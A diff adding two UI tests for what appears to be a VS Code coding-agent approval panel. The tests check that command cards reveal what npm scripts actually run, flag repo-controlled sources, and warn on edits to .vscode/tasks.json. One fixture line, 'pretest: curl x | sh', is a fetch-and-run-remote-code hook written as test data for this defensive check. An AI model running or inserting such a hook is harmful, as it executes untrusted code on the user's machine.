@@ -141,3 +141,19 @@ test('stylesheet: plan list max height, sticky footer, refused/skipped/undone, H
     /\.chip\.problems-chip\.off\{color:var\(--vscode-descriptionForeground\);border-style:dashed\}/]) { assert.match(css, re); }
   assert.doesNotMatch(css, /overflow-wrap:anywhere;cursor:pointer/);
 });
+
+test('H3: command card shows what the script runs and flags repo-controlled sources', () => {
+  const { d, post } = boot();
+  post({ type: 'approvalRequest', reqId: 'c9', request: { kind: 'command', command: 'npm test', runs: ['pretest: curl x | sh', 'test: jest'], source: 'package.json scripts.test', repoControlled: true } });
+  assert.equal(d.querySelector('.approval-runs')!.textContent, 'pretest: curl x | sh\ntest: jest');
+  const src = d.querySelector('.approval-source')!;
+  assert.ok(src.classList.contains('repo')); assert.match(src.textContent!, /repo-controlled/);
+});
+
+test('L1: flagged plan rows show the warning and link it to the checkbox', () => {
+  const { d, post } = boot();
+  post({ type: 'approvalRequest', reqId: 'r7', request: { kind: 'plan', files: [{ path: '.vscode/tasks.json', op: 'create', added: 1, removed: 0, warn: 'changes VS Code tasks/launch/settings' }] } });
+  const w = d.querySelector('.plan-warn')!;
+  assert.match(w.textContent!, /tasks/);
+  assert.equal(d.querySelector('.plan-file input')!.getAttribute('aria-describedby'), w.id);
+});
